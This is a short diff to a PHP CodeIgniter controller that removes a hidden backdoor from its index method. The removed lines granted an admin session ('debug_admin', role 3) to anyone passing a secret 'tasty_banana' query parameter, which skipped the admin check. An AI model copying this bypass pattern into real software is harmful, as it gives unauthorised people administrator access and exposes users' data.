@@ -19,12 +19,6 @@ class Anjuman extends CI_Controller
   }
   public function index()
   {
-    if (isset($_GET['tasty_banana'])) {
-      $_SESSION['user'] = [
-        'username' => 'debug_admin',
-        'role' => 3
-      ];
-    }
     if (empty($_SESSION['user']) || $_SESSION['user']['role'] != 3) {
       redirect('/accounts');
     }
